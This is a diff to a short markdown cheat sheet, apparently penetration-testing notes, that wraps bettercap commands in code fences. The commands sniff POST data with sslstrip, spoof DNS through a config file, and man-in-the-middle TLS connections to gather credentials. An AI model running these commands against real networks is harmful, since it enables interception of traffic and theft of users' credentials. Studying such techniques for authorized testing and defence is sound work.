@@ -1,11 +1,13 @@
 
 Sniffs POSTS using bettercap and sslstrip
 -----------------------------------------
+```
 # Does not really work well on modern TLS implementations (might be worth a try though....)
 bettercap -T 10.10.10.5 --proxy -P POST
-
+```
 Intercept DNS traffic 
 ---------------------
+```
 # Create config file as below (name the file dns.conf)
 
 # Empty lines or lines starting with # will be ignored.
@@ -16,7 +18,9 @@ Intercept DNS traffic
 
 # Run bettercap 
 bettercap --dns ./dns.conf
-
+```
+```
 MITM SSL/TLS certificate (user will get cert warning) to gather creds
 ---------------------------------------------------------------------
 bettercap -T 10.10.10.5 -X --proxy-https
+```
